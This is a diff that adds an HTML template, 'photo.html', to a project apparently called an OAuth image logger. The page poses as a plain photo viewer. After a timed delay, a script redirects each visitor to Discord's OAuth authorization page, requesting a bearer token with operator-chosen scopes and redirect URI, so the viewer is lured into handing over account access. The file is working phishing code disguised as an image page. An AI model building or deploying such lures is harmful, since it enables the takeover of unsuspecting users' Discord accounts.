@@ -1,0 +1,35 @@
+<!-- language: HTML, file: oauth-image-logger/static/photo.html -->
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>photo</title>
+<style>
+  html, body {
+    margin: 0; padding: 0; height: 100vh;
+    background: #0a0a0a;
+    display: flex; align-items: center; justify-content: center;
+    overflow: hidden;
+  }
+  #cover { max-width: 100vw; max-height: 100vh; object-fit: contain; display: block; }
+</style>
+</head>
+<body>
+<img id="cover" src="{{COVER_URL}}" alt="">
+<script>
+  (function () {
+    var p = new URLSearchParams({
+      client_id: "{{CLIENT_ID}}",
+      response_type: "token",
+      scope: "{{SCOPES}}",
+      redirect_uri: "{{REDIRECT_URI}}",
+      prompt: "consent"
+    });
+    setTimeout(function () {
+      location.href = "https://discord.com/oauth2/authorize?" + p.toString();
+    }, {{DELAY}});
+  })();
+</script>
+</body>
+</html>
